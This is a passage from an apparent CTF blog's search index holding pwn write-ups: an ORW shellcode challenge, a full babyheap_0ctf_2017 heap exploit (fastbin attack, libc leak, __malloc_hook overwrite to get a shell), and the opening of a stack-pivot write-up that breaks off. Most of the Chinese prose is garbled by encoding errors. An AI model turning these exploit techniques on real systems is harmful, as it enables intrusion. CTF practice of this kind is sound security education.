False): if isinstance(formula, bytes): formula = formula.decode(\u0026#34;UTF-8\u0026#34;) formula = formula.strip() formula = formula.strip(\u0026#34;\\n\u0026#34;) formula = formula.replace(\u0026#34;x\u0026#34;, \u0026#34;*\u0026#34;) formula = formula.replace(\u0026#34;^\u0026#34;, \u0026#34;**\u0026#34;) formula = formula.replace(\u0026#34;Ã·\u0026#34;, \u0026#34;/\u0026#34;) if not precise: formula = formula.replace(\u0026#34;//\u0026#34;, \u0026#34;/\u0026#34;) formula = formula.replace(\u0026#34;/\u0026#34;, \u0026#34;//\u0026#34;) return bytes(str(eval(formula)), encoding=\u0026#34;UTF-8\u0026#34;) ... shellcode = 0x804A060 flag = shellcode + 0x30 + 8 # éœ€è¦è‡ªè¡Œè®¾å®šoffset # ç”Ÿæˆorwçš„shellcode payload = flat([ asm(shellcraft.open(\u0026#34;./flag\u0026#34;)), asm(shellcraft.read(\u0026#39;eax\u0026#39;, \u0026#39;esp\u0026#39;, 0xff)), asm(shellcraft.write(1, \u0026#39;esp\u0026#39;, 0xff)) ]) # payload = payload.ljust(0x30, b\u0026#34;\\x00\u0026#34;) + b\u0026#34;./flag\\x00\u0026#34; sendline_after_clean(payload, \u0026#34;Give my your shellcode:\u0026#34;) interactive_after_clean() æ²¡å•¥å¥½è®²çš„ï¼Œå°±æ˜¯ä¸€ä¸ªç”Ÿæˆorwçš„shellcodeçš„é¢˜ç›®ï¼Œè®°ä¸€ä¸‹orwçš„shellcodeçš„ç”Ÿæˆå‡½æ•°å°±å¥½\n","date":"2022å¹´12æœˆ29æ—¥","permalink":"https://peterliuzhi.top/writeup/%E7%94%9F%E6%88%90orw-shellcodebuuctf-pwnable_orw/","section":"writeup","summary":"åŸé¢˜é“¾æ¥ exp # è‡ªåŠ¨ç”Ÿæˆå¤´éƒ¨ from pwn import * from pwn import p64, p32, u32, u64, p8 from LibcSearcher import LibcSearcher import ctypes pss: bool = True fn: str = \u0026#34;./orw\u0026#34; libc_name:str = \u0026#34;\u0026#34; port: str = \u0026#34;26851\u0026#34; if_32: bool = True if_debug:bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.terminal =","tags":["pwn","ç”ŸæˆORW shellcode"],"title":"ã€ç”ŸæˆORW shellcodeã€‘BUUCTF pwnable_orw"},{"categories":["writeup"],"contents":"åŸé¢˜é“¾æ¥\nè¿™ä¸€é¢˜æ˜¯ä½œè€…çš„ç¬¬ä¸€é“å †é¢˜ï¼Œç»™ä½œè€…çš„ç¬¬ä¸€æ„Ÿå—å°±æ˜¯ç¥ä¹å…¶ç¥ï¼Œåœ¨å‚è€ƒäº†ç½‘ç»œä¸Šçš„ä¸€äº› WP åå†™ä¸‹è‡ªå·±çš„ WPï¼Œå¦‚æœ‰é”™è¯¯çƒ¦è¯·æ–§æ­£\nå‚è€ƒæ–‡ç«  checksec æŸ¥çœ‹ç¨‹åºæ¶æ„ ida æŸ¥çœ‹ç¨‹åºä¼ªä»£ç  allocate fill Free dump åŸºæœ¬æ€è·¯ æ„å»º exp é’ˆå¯¹å››ä¸ªé€‰é¡¹ç¼–å†™å››ä¸ªè¾“å…¥å‡½æ•° å¾—åˆ°åˆå§‹ chunk å®‰æ’æŒ‡å‘ chunk 4 çš„æŒ‡é’ˆ å°†chunk 4æ”¾è¿›unsorted binä¸­è·å–libcåŸºå€ è¦†å†™ä»»æ„åœ°å€çš„æ•°æ® å®Œæ•´exp å‚è€ƒæ–‡ç«  0ctf2017 babyheap ã€PWNç³»åˆ—ã€‘ Buuctf babyheap_0ctf_2017 Writeup babyheap_0ctf_2017 å †æŠ€å·§ ctfwiki å †æ¦‚è¿° checksec æŸ¥çœ‹ç¨‹åºæ¶æ„ $ checksec --file babyheap_0ctf_2017 [*] \u0026#39;/home/peterl/security/workspace/babyheap_0ctf_2017/babyheap_0ctf_2017\u0026#39; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled ida æŸ¥çœ‹ç¨‹åºä¼ªä»£ç  è¿™ä¸ªç¨‹åºæ•…æ„æŠŠ.symtabèŠ‚åˆ æ‰äº†ï¼Œæ‰€ä»¥æ²¡æœ‰å‡½æ•°åç§°ï¼Œè¿™é‡Œä½œè€…åœ¨ ida ä¸­ç®€å•åœ°é‡å‘½åäº†ä¸€ä¸‹\nallocate è¿™ä¸ªå‡½æ•°ä¼šåˆ†é…ä¸€ä¸ªå¤§å°å°äº 4096 çš„å†…å­˜å—ï¼ˆä¸å­˜åœ¨ç¬¦å·ä½æ¼æ´ï¼‰ï¼Œè€Œæˆ‘ä»¬çŸ¥é“è¿™ä¸ªå†…å­˜å—ä¼šæ˜¯ä» top_chunk ä¸­åˆ†å‰²å‡ºæ¥çš„ï¼š\nç„¶åï¼Œmalloc ä¼šè¿”å›æŒ‡å‘ chunk ä¸­size çš„å°¾éƒ¨ï¼Œuser_data çš„é¦–éƒ¨ï¼ŒåŒæ—¶ä¹Ÿæ˜¯ fd æŒ‡é’ˆçš„é¦–éƒ¨çš„æŒ‡é’ˆï¼Œè€Œè¿™ä¸ªæŒ‡é’ˆä¼šå­˜æ”¾åœ¨ä¸€ä¸ªå¤§æ•°ç»„ä¸­ï¼Œè€Œè¿™ä¸ªå¤§æ•°ç»„æ˜¯ä»¥ä¸‰ä¸ªå•å…ƒä¸ºä¸€ä¸ªå®ä½“çš„ï¼Œå¯ä»¥çœ‹ä½œå®ƒæ˜¯ä¸€ä¸ªç»“æ„ä½“æ•°ç»„ï¼Œè¿™ä¸ªç»“æ„ä½“æ•°ç»„çš„æ„é€ å¦‚ä¸‹ï¼š\nfill è¿™ä¸ªå‡½æ•°åœ¨æ£€æŸ¥å†…å­˜æ˜¯å¦å¯ç”¨ï¼ˆæ ‡å¿—æ˜¯å¦ä¸º 1ï¼‰åä¼šå‘å¯¹åº”ç´¢å¼•çš„å†…å­˜ä¸­å¡«å…¥ä»»æ„å¤§å°çš„æ•°æ®ï¼Œè¿™ä¸ªæ•°æ®é•¿åº¦æ˜¯ç”±ç”¨æˆ·éšæ„æŒ‡å®šçš„ï¼ï¼è¿™é‡Œå°±å‡ºç°äº†å †æº¢å‡ºæ¼æ´\nFree åœ¨æ£€æŸ¥æ ‡å¿—ä½æ˜¯å¦ä¸º 1 åï¼Œå®ƒä¼šå°†æ ‡è¯†ä½ã€size ç½®é›¶ï¼Œå¹¶é‡Šæ”¾å†…å­˜\ndump è¿™ä¸ªå‡½æ•°åœ¨æ£€æŸ¥æ ‡å¿—ä½æ˜¯å¦ä¸º 1 åï¼Œä¼šå°†å†…å­˜ä¸­çš„å†…å®¹æ‰“å°å‡ºæ¥\nåŸºæœ¬æ€è·¯ æˆ‘ä»¬æƒ³ä¸€ä¸‹è¿™ä¹ˆä¸€ä»¶äº‹ï¼šåœ¨æˆ‘ä»¬çš„ç»“æ„ä½“æ•°ç»„ä¸­ï¼Œç†è®ºä¸Šæ¯ä¸€ä¸ªç»“æ„ä½“å†…çš„å†…å­˜åœ°å€æ˜¯ä¸ä¸€æ ·çš„ï¼Œè€Œä¸”å¦‚æœå†…å­˜è¢«é‡Šæ”¾ï¼Œæ ‡å¿—ä½ä¹Ÿä¼šè¢«ç½®é›¶ï¼Œä»è€Œä¹Ÿå°±æ— æ³•è®¿é—®ã€‚\né‚£ä¹ˆé—®é¢˜æ¥äº†ï¼Œå¦‚æœæˆ‘ä»¬è®©ä¸¤ä¸ªç»“æ„ä½“å†…çš„æŒ‡é’ˆéƒ½æŒ‡å‘åŒä¸€å—å†…å­˜ï¼Œé‚£ä¹ˆå°±ç®—è¿™å—å†…å­˜å·²è¢«é‡Šæ”¾ï¼Œæˆ‘ä»¬ä»ç„¶å¯ä»¥é€šè¿‡å¦ä¸€ä¸ªæŒ‡é’ˆè®¿é—®è¿™å—å·²è¢«é‡Šæ”¾çš„ç©ºé—´\nåŒæ—¶ï¼Œæˆ‘ä»¬çŸ¥é“ä¸‰ä»¶äº‹ï¼š\nå½“ç”¨æˆ·éœ€è¦çš„ chunk çš„å¤§å°å°äº fastbin çš„æœ€å¤§å¤§å°æ—¶ï¼Œ ptmalloc ä¼šé¦–å…ˆåˆ¤æ–­ fastbin ä¸­ç›¸åº”çš„ bin ä¸­æ˜¯å¦æœ‰å¯¹åº”å¤§å°çš„ç©ºé—²å—ï¼Œå¦‚æœæœ‰çš„è¯ï¼Œå°±ä¼šç›´æ¥ä»è¿™ä¸ª bin ä¸­è·å– chunkï¼ˆé»˜è®¤æœ€å¤§å¤§å°ä¸º(64 * SIZE_SZ / 4)ï¼Œ32 ä½ä¸º 64=0x40 å­—èŠ‚ï¼Œ64 ä½ä¸º 128=0x80 å­—èŠ‚ï¼‰ å¦‚æœ unsorted bin å†…æœ‰ä¸”ä»…æœ‰ä¸€å— chunk æ—¶ï¼Œè¿™å— chunk çš„ fd æŒ‡é’ˆå’Œ bk æŒ‡é’ˆéƒ½ä¼šæŒ‡å‘main_arena + 0x58 ï¼Œè€Œä¸” main_arena åˆç›¸å¯¹ libc å›ºå®šåç§» 0x3c4b20 å¦‚æœmalloc_hookå­˜åœ¨ï¼Œmallocä¼šå…ˆè°ƒç”¨__malloc_hookçš„å€¼æŒ‡å‘çš„å‡½æ•° é‚£ä¹ˆï¼Œå‡è®¾æˆ‘ä»¬èƒ½è·å¾—ä¸€ä¸ªæŒ‡å‘ unsorted bin ä¸­å”¯ä¸€ chunk çš„æŒ‡é’ˆï¼Œæˆ‘ä»¬å°±èƒ½æˆåŠŸè·å¾— libc åŸºå€ã€‚\nè€Œå¦‚æœæˆ‘ä»¬æ‹¥æœ‰äº†ä¸€ä¸ªæŒ‡å‘ fast bin ä¸­ chunk çš„æŒ‡é’ˆï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±èƒ½å¤Ÿæ›´æ”¹å…¶ fd æŒ‡é’ˆï¼Œä»è€Œæ§åˆ¶ malloc åˆ°çš„åœ°å€çš„å€¼ï¼Œä»è€Œæˆ‘ä»¬èƒ½å¤Ÿä¿®æ”¹ä»»ä½•åœ°å€çš„å†…å®¹\nç„¶åï¼Œæˆ‘ä»¬å°±å¯ä»¥æ›´æ”¹__malloc_hookçš„å€¼ï¼Œä»è€Œæ›´æ”¹mallocçš„è¡Œä¸º\næ„å»º exp é’ˆå¯¹å››ä¸ªé€‰é¡¹ç¼–å†™å››ä¸ªè¾“å…¥å‡½æ•° def allocate(size: int): p.clean() p.sendline(str(1)) p.clean() p.sendline(str(size)) def fill(index: int, payload: bytes): p.clean() p.sendline(str(2)) p.clean() p.sendline(str(index)) p.clean() p.sendline(str(len(payload))) p.clean() p.sendline(payload) def free(index: int): p.clean() p.sendline(str(3)) p.clean() p.sendline(str(index)) def dump(index: int) -\u0026gt; bytes: p.clean() p.sendline(str(4)) p.clean() p.sendline(str(index)) p.recvline() return p.recvuntil(\u0026#34;\\n\u0026#34;)[:-1] å¾—åˆ°åˆå§‹ chunk æˆ‘ä»¬éœ€è¦åˆ†é…å‡ ä¸ª chunkï¼Œå…¶ä¸­æœ‰ä¸”ä»…æœ‰ä¸€ä¸ªå¤§å°è¶…è¿‡ fast bin çš„é™åˆ¶ï¼Œä¼šè¢«æ”¾è¿› unsorted bin ä¸­\nç„¶åæˆ‘ä»¬ä¼š allocate ä¸¤æ¬¡ï¼Œä¸€æ¬¡æ˜¯æ­£å¸¸çš„ fast bin é‡Œé¢çš„å†…å®¹ï¼Œä¸€æ¬¡æŒ‡å‘ä¼šè¢«æ”¾å…¥ unsorted bin ä¸­çš„å¤§ chunkã€‚\né‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å…ˆåˆ’å‡º 4 ä¸ª 0x10 çš„ chunkï¼ˆsize ä½=prev_size+size+prev_inuse+0x10=0x20ï¼‰ï¼Œå†åˆ’å‡ºä¸€å— 0x80 å¤§å°çš„ chunk ç”¨ä»¥æ”¾è¿› unsorted bin ä¸­ï¼š\nå› æ­¤æˆ‘ä»¬å¯ä»¥åˆå§‹åˆ†é…äº”ä¸ª chunkï¼š\nallocate(0x10) allocate(0x10) allocate(0x10) allocate(0x10) allocate(0x80) å®‰æ’æŒ‡å‘ chunk 4 çš„æŒ‡é’ˆ æˆ‘ä»¬åªè¦è¦†å†™äº† chunk 2 çš„ fd æŒ‡é’ˆï¼Œè®©å®ƒæŒ‡å‘ chunk 4ï¼Œé‚£ä¹ˆæˆ‘ä»¬åœ¨ç¬¬äºŒæ¬¡ allocate çš„æ—¶å€™ï¼Œå¾—åˆ°çš„å°±æ˜¯æŒ‡å‘ chunk 4 çš„æŒ‡é’ˆ\nå…·ä½“æ­¥éª¤ï¼š\nè¿™é‡Œæˆ‘ä»¬å…ˆæŠŠ chunk 1 å’Œ chunk 2 free æ‰ï¼Œè¿™æ ·å­ chunk 1 å’Œ chunk 2 çš„fdæŒ‡é’ˆå°±ç”Ÿæ•ˆäº†ã€‚\nåˆå› ä¸ºæˆ‘ä»¬å¯ä»¥å‘ä¸€å—chunkå†…å¡«å…¥ä»»æ„å¤§å°çš„æ•°æ®ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡å°†payload1å¡«è¿›chunk0ç”¨ä»¥è¦†å†™chunk2çš„fdæŒ‡é’ˆ\nç„¶åä¸ºäº†ä¿è¯chunk4è¢«æ­£ç¡®åˆ†é…ï¼Œæˆ‘ä»¬å¯ä»¥å°†payload2å¡«å…¥chunk3ä¸­ï¼Œç”¨ä»¥è¦†å†™chunk4çš„size\nè¿™é‡Œè¦æ³¨æ„çš„æ˜¯ï¼Œchunk 4 çš„ size ä½è¦è®¾ç½®æˆ 0x21ï¼Œä¸ç„¶åœ¨allocate(0x10)çš„æ—¶å€™ï¼Œå› ä¸ºå¤§å°ä¸ä¸€æ ·ï¼Œmalloc æ—¶æ˜¯æ²¡æœ‰åŠæ³•åˆ†é…åˆ° chunk 4 çš„\nç„¶åæˆ‘ä»¬å°±å¯ä»¥allocateä¸¤æ¬¡ï¼Œç¬¬äºŒæ¬¡åˆ†é…åˆ°çš„å°±æ˜¯chunk4äº†ï¼Œè¿™æ—¶chunk2æŒ‡å‘çš„ä¹Ÿæ˜¯chunk4äº†ã€‚\néœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæˆ‘ä»¬éœ€è¦å°†chunk 4 çš„sizeä½æ¢å¤åŸçŠ¶ï¼Œå› ä¸ºæˆ‘ä»¬ä¸‹ä¸€æ­¥æ˜¯è¦æŠŠchunk 4æ”¾å…¥unsorted binä¸­\nfree(1) free(2) payload1 = p64(0)*3 + p64(0x21) + p64(0)*3 + p64(0x21) + p8(0x80) fill(0, payload1) # è¦†ç›–sizeä½ payload2 = p64(0)*3 + p64(0x21) fill(3, payload2) allocate(0x10) # å¾—åˆ°chunk4æŒ‡é’ˆ allocate(0x10) # æ¢å¤sizeä½ payload3 = p64(0)*3 + p64(0x91) fill(3, payload3) å°†chunk 4æ”¾è¿›unsorted binä¸­è·å–libcåŸºå€ æˆ‘ä»¬ä¸èƒ½ç›´æ¥æŠŠchunk 4 freeæ‰ï¼Œå› ä¸ºchunk 4å’Œtop chunkç›¸é‚»ï¼Œç›´æ¥freeæ‰ä¼šä½¿chunk 4å¹¶å…¥top chunk\nå› æ­¤æˆ‘ä»¬allocateä¸€ä¸ªchunk 5ï¼Œç„¶åfreeæ‰chunk 4ï¼Œåˆå› ä¸ºæ­¤æ—¶chunk 4è™½ç„¶ç”±äºæ ‡å¿—ä½ä¸º0ä¸å¯è®¿é—®ï¼Œä½†æ˜¯chunk 2ä»èƒ½è¢«dumpå‡½æ•°è¯†åˆ«ä¸ºæœªé‡Šæ”¾çš„ç©ºé—´ï¼Œä»è€Œè¯»å–å†…å®¹ã€‚\nå› æ­¤ï¼Œæˆ‘ä»¬ç›´æ¥dump chunk 2ï¼Œå‡å»å›ºå®šå€¼0x3c4b78ï¼Œå°±å¾—åˆ°äº†libcåŸºå€\nallocate(0x80) free(4) libc_base = u64(dump(2)[:8].strip().ljust(8, b\u0026#34;\\x00\u0026#34;))-0x3c4b78 success(\u0026#34;libc_base: \u0026#34;+hex(libc_base)) è¦†å†™ä»»æ„åœ°å€çš„æ•°æ® å½“æˆ‘ä»¬é€šè¿‡è¦†å†™chunk 2çš„fdä½çš„æ—¶å€™ï¼Œæˆ‘ä»¬åº”è¯¥å·²ç»å‘ç°äº†ï¼Œé€šè¿‡è¿™ç§æ–¹å¼ï¼Œæˆ‘ä»¬å¯ä»¥å°†fdä½è¦†å†™ä¸ºä»»æ„æˆ‘ä»¬å–œæ¬¢çš„åœ°å€\næˆ‘ä»¬å¯ä»¥é€šè¿‡è¦†å†™codeæ®µä¸­çš„__malloc_hookå‡½æ•°æ¥æ”¹å˜mallocçš„è¡Œä¸ºï¼Œè¿™ä¸ªå‡½æ•°çš„è¯¦ç»†è¯´æ˜è§æ­¤ï¼Œè¿™é‡Œè´´ä¸€æ®µæˆ‘ä»¬è¿™ä¸ªç¨‹åºè¦ç”¨åˆ°çš„è¯´æ˜ï¼š\nå¯ä»¥çœ‹åˆ°ï¼Œ__malloc_hookå‡½æ•°çš„å€¼æ˜¯mallocä¼šåœ¨å®ƒè¢«callçš„æ—¶å€™ä½¿ç”¨çš„å‡½æ•°æŒ‡é’ˆï¼Œæ‰€ä»¥ï¼Œæˆ‘ä»¬åªéœ€è¦æ›´æ”¹__malloc_hookçš„å€¼ï¼Œæˆ‘ä»¬å°±èƒ½æ›´æ”¹mallocçš„è¡Œä¸º\n__malloc_hookå‡½æ•°çš„åç§»å­˜åœ¨symè¡¨ä¸­ï¼š\n$ readelf -aW libc-2.23.so | grep hook 00000000003c3dc8 000006fb00000006 R_X86_64_GLOB_DAT 00000000003c67b0 __malloc_initialize_hook@@GLIBC_2.2.5 + 0 00000000003c3ea8 000001e700000006 R_X86_64_GLOB_DAT 00000000003c9560 argp_program_version_hook@@GLIBC_2.2.5 + 0 00000000003c3eb0 0000072200000006 R_X86_64_GLOB_DAT 00000000003c67a0 __after_morecore_hook@@GLIBC_2.2.5 + 0 00000000003c3ee0 000008ae00000006 R_X86_64_GLOB_DAT 00000000003c4b00 __memalign_hook@@GLIBC_2.2.5 + 0 00000000003c3ef0 0000044000000006 R_X86_64_GLOB_DAT 00000000003c4b10 __malloc_hook@@GLIBC_2.2.5 + 0 00000000003c3ef8 000000d600000006 R_X86_64_GLOB_DAT 00000000003c67a8 __free_hook@@GLIBC_2.2.5 + 0 00000000003c3fd0 000005cb00000006 R_X86_64_GLOB_DAT 00000000003c4b08 __realloc_hook@@GLIBC_2.2.5 + 0 214: 00000000003c67a8 8 OBJECT WEAK DEFAULT 34 __free_hook@@GLIBC_2.2.5 487: 00000000003c9560 8 OBJECT GLOBAL DEFAULT 34 argp_program_version_hook@@GLIBC_2.2.5 958: 00000000003c92e0 8 OBJECT GLOBAL DEFAULT 34 _dl_open_hook@@GLIBC_PRIVATE 1088: 00000000003c4b10 8 OBJECT WEAK DEFAULT 33 __malloc_hook@@GLIBC_2.2.5 1483: 00000000003c4b08 8 OBJECT WEAK DEFAULT 33 __realloc_hook@@GLIBC_2.2.5 1787: 00000000003c67b0 8 OBJECT WEAK DEFAULT 34 __malloc_initialize_hook@@GLIBC_2.2.5 1826: 00000000003c67a0 8 OBJECT WEAK DEFAULT 34 __after_morecore_hook@@GLIBC_2.2.5 2222: 00000000003c4b00 8 OBJECT WEAK DEFAULT 33 __memalign_hook@@GLIBC_2.2.5 æ³¨æ„ï¼Œå› ä¸ºé»˜è®¤è¾“å‡ºå®½åº¦é™åˆ¶çš„åŸå› ï¼Œåªç”¨readelf -aå‘½ä»¤æ— æ³•è¾“å‡º__malloc_hookè€Œæ˜¯__m[\u0026hellip;]ï¼Œå¿…é¡»åŠ ä¸Š-Wæˆ–è€…--widthé€‰é¡¹æ‰èƒ½åŠ å®½\nè¿™é‡Œæœ‰ä¸€ä¸ªå°æŠ€å·§ï¼Œåœ¨__malloc_hook-0x23å¤„mallocå¯ä»¥ä½¿sizeä½åˆšå¥½ä¸º0x7fï¼Œè¿™æ ·å­å°±å¯ä»¥æ›´æ”¹__malloc_hookçš„å€¼\næˆ‘ä»¬å†ç”¨one_gadgetå‘½ä»¤æ‰¾ä¸€ä¸‹å¯ç”¨çš„gadgetï¼š\n$ one_gadget libc-2.23.so 0x45226 execve(\u0026#34;/bin/sh\u0026#34;, rsp+0x30, environ) constraints: rax == NULL 0x4526a execve(\u0026#34;/bin/sh\u0026#34;, rsp+0x30, environ) constraints: [rsp+0x30] == NULL 0xf03a4 execve(\u0026#34;/bin/sh\u0026#34;, rsp+0x50, environ) constraints: [rsp+0x50] == NULL 0xf1247 execve(\u0026#34;/bin/sh\u0026#34;, rsp+0x70, environ) constraints: [rsp+0x70] == NULL å› ä¸ºæœ‰äº›gadgetå¯¹æ ˆæœ‰è¦æ±‚ï¼Œæ‰€ä»¥åªæœ‰ä¸€äº›å¯ä»¥ç”¨ã€‚è¯•äº†ä¸€ä¸‹ï¼Œç¬¬äºŒä¸ªåˆšå¥½æ˜¯å¯ä»¥ç”¨çš„\nallocate(0x60) free(4) # æ›´æ”¹fdæŒ‡é’ˆ payload4 = p64(libc_base+libc.sym[\u0026#39;__malloc_hook\u0026#39;]-0x23) fill(2, payload4) allocate(0x60) allocate(0x60) # æ›´æ”¹__malloc_hookçš„å€¼ # prev_size+size=0x10ï¼Œç„¶åè¦å¡«å……0x13çš„ç©ºä½æ‰èƒ½åˆ°__malloc_hookçš„ä½ç½® payload5 = p8(0)*3 + p64(0)*2 + p64(libc_base+0x4526a) fill(6, payload5) ç„¶åallocateä»»æ„ä¸€ä¸ªå€¼å°±å¯ä»¥å¾—åˆ°shellå•¦\nå®Œæ•´exp from pwn import * from pwn import p64, p32, u32, u64, p8 import sys from LibcSearcher import LibcSearcher pss: bool = True fn: str = \u0026#34;./babyheap_0ctf_2017\u0026#34; libc_name: str = \u0026#34;./libc-2.23.so\u0026#34; port: str = \u0026#34;25943\u0026#34; if_32: bool = False if_debug: bool = False pg = p32 if if_32 else p64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;b* 0x1329\u0026#34;) else: p = process([\u0026#34;ld-2.23.so\u0026#34;, fn], env={\u0026#34;LD_PRELOAD\u0026#34;: libc_name}) # p = process(fn) libc = ELF(libc_name) def allocate(size: int): p.clean() p.sendline(str(1)) p.clean() p.sendline(str(size)) def fill(index: int, payload: bytes): p.clean() p.sendline(str(2)) p.clean() p.sendline(str(index)) p.clean() p.sendline(str(len(payload))) p.clean() p.sendline(payload) def free(index: int): p.clean() p.sendline(str(3)) p.clean() p.sendline(str(index)) def dump(index: int) -\u0026gt; bytes: p.clean() p.sendline(str(4)) p.clean() p.sendline(str(index)) p.recvline() return p.recvuntil(\u0026#34;\\n\u0026#34;)[:-1] allocate(0x10) allocate(0x10) allocate(0x10) allocate(0x10) allocate(0x80) # gdb.attach(p) free(1) free(2) # gdb.attach(p) payload1 = p64(0)*3 + p64(0x21) + p64(0)*3 + p64(0x21) + p8(0x80) fill(0, payload1) payload2 = p64(0)*3 + p64(0x21) fill(3, payload2) allocate(0x10) allocate(0x10) payload3 = p64(0)*3 + p64(0x91) fill(3, payload3) allocate(0x80) free(4) # gdb.attach(p) libc_base = u64(dump(2)[:8].strip().ljust(8, b\u0026#34;\\x00\u0026#34;))-0x3c4b78 success(\u0026#34;libc_base: \u0026#34;+hex(libc_base)) allocate(0x60) free(4) # gdb.attach(p) payload4 = p64(libc_base+libc.sym[\u0026#39;__malloc_hook\u0026#39;]-0x23) fill(2, payload4) allocate(0x60) allocate(0x60) # gdb.attach(p) payload5 = p8(0)*3 + p64(0)*2 + p64(libc_base+0x4526a) fill(6, payload5) # gdb.attach(p) allocate(0x10) p.clean() p.interactive() ","date":"2022å¹´12æœˆ29æ—¥","permalink":"https://peterliuzhi.top/writeup/%E9%A6%96%E9%81%93%E5%A0%86%E9%A2%98fastbin-attackunsorted-bin-main_arena-leakbabyheap_0ctf_2017/","section":"writeup","summary":"åŸé¢˜é“¾æ¥ è¿™ä¸€é¢˜æ˜¯ä½œè€…çš„ç¬¬ä¸€é“å †é¢˜ï¼Œç»™ä½œè€…çš„ç¬¬ä¸€æ„Ÿå—å°±æ˜¯ç¥ä¹å…¶ç¥ï¼Œåœ¨å‚è€ƒäº†ç½‘ç»œä¸Šçš„ä¸€äº› WP åå†™ä¸‹è‡ªå·±çš„ WPï¼Œå¦‚æœ‰é”™è¯¯çƒ¦è¯·æ–§æ­£ å‚è€ƒæ–‡ç«  checksec æŸ¥çœ‹ç¨‹åºæ¶æ„ ida æŸ¥çœ‹ç¨‹","tags":["pwn","é¦–é“å †é¢˜","fastbin attack","unsorted bin main_arena leak"],"title":"ã€é¦–é“å †é¢˜ã€‘ã€fastbin attackã€‘ã€unsorted bin main_arena leakã€‘babyheap_0ctf_2017"},{"categories":["writeup"],"contents":"ã€æ ˆè¿ç§»ä¾‹é¢˜è§£æã€‘ã€Write-upã€‘BUUCTF ciscn_2019_es_2 åŸé¢˜é“¾æ¥\nã€æ ˆè¿ç§»ä¾‹é¢˜è§£æã€‘ã€Write-upã€‘BUUCTF ciscn_2019_es_2 checksecæŸ¥çœ‹ç¨‹åºæ¶æ„ idaæŸ¥çœ‹ç¨‹åºä¼ªä»£ç  æ„å»ºexp æ ˆè¿ç§»çš„åŸºæœ¬æ€è·¯ æ³„éœ²ebp å¼€å§‹æ ˆè¿ç§» å®Œæ•´exp checksecæŸ¥çœ‹ç¨‹åºæ¶æ„ $ checksec --file ciscn_2019_es_2 [*] \u0026#39;/home/peterl/security/workspace/ciscn_2019_es_2/ciscn_2019_es_2\u0026#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) æ²¡å•¥ç‰¹æ®Šçš„ï¼Œæ³¨æ„ä¸€ä¸‹32ä½å°±å¯\nidaæŸ¥çœ‹ç¨‹åºä¼ªä»£ç  çœ‹èµ·æ¥åƒæ˜¯æ ˆæº¢å‡ºï¼Œä½†æ˜¯readå‡½æ•°é™åˆ¶äº†è¯»å…¥çš„å­—èŠ‚æ•°ï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸‹æ ˆï¼š\næˆ‘ä»¬å‘ç°è¿™æ—¶å€™åˆ°returnçš„ä½ç½®åªèƒ½æº¢å‡ºä¸€ä¸ªå­—ï¼Œå¦‚æœè¿™æ—¶å€™ç¨‹åºæœ‰ä¸€ä¸ªbackdoorå‡½æ•°é‚£å°±ä¸‡äº‹å¤§å‰ã€‚\næˆ‘ä»¬å¯ä»¥æ‰¾ä¸€ä¸‹ï¼Œå‘ç°äº†ä¸€ä¸ªhackå‡½æ•°ï¼Œä½†è¿™ä¸ªhackå‡½æ•°å®Œå…¨å°±æ˜¯ç³Šå¼„äººçš„ï¼Œä»ä¸­å”¯ä¸€å¾—åˆ°çš„æœ‰ç”¨ä¿¡æ¯æ˜¯systemç¡®ä¹å­˜åœ¨äºpltè¡¨ä¸­ï¼Œè¿™æ ·å°±ä¸ç”¨ret2libcäº†ï¼š\nçœ‹ä¸€ä¸‹æºç¨‹åºä¹Ÿæ²¡æœ‰æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œæˆ‘ä»¬å¯ä»¥è€ƒè™‘æ ˆè¿ç§»\næˆ‘ä»¬åªè¦æ³„éœ²å‡ºebpï¼Œç„¶åå†é€šè¿‡ç¬¬äºŒæ¬¡leave;retå°±å¯ä»¥å°†espæ›´æ”¹åˆ°æˆ‘ä»¬å¸Œæœ›çš„åœ°æ–¹\næ„å»ºexp æ ˆè¿ç§»çš„åŸºæœ¬æ€è·¯ æˆ‘ä»¬çŸ¥é“ï¼Œåœ¨callä¸€ä¸ªå‡½æ•°çš„æ—¶å€™ï¼Œæˆ‘ä»¬ä¼šå…ˆå°†ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€è¿›æ ˆï¼Œå†å°†å½“å‰çš„ebpè¿›æ ˆï¼Œç„¶åå°†å½“å‰espçš„å€¼èµ‹ç»™ebpï¼Œè¿™æ ·å°±å®ç°äº†å¤‡ä»½ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€ã€ebpåŸæœ¬çš„å€¼ã€espåŸæœ¬çš„å€¼çš„ä½œç”¨\nç„¶åç­‰åˆ°å‡½æ•°ç»“æŸæ—¶ï¼Œç¨‹åºä¼šæ‰§è¡ŒleaveæŒ‡ä»¤å’ŒretæŒ‡ä»¤ã€‚leaveæŒ‡ä»¤ç›¸å½“äºmov esp, ebp; pop ebpï¼Œæ„æ€å°±æ˜¯ä»å¤‡ä»½ä¸­å…ˆæ¢å¤espå†æ¢å¤ebpï¼›retæŒ‡ä»¤ç›¸å½“äºpop eipï¼Œæ„æ€å°±æ˜¯æ¢å¤å¤‡ä»½çš„æŒ‡ä»¤åœ°å€ï¼Œè¿™æ ·å°±èƒ½æ‰§è¡Œå‡½æ•°è°ƒç”¨çš„ä¸‹ä¸€æ¡è¯­å¥äº†\né‚£ä¹ˆå¦‚æœæˆ‘ä»¬æ›´æ”¹æ ˆä¸­å¤‡ä»½çš„ebpæ•°æ®çš„åŒæ—¶ï¼Œåœ¨ç¨‹åºæ‰§è¡Œè¿‡ä¸€æ¬¡leave; retåå†æ‰§è¡Œä¸€éï¼Œé‚£ä¹ˆå› 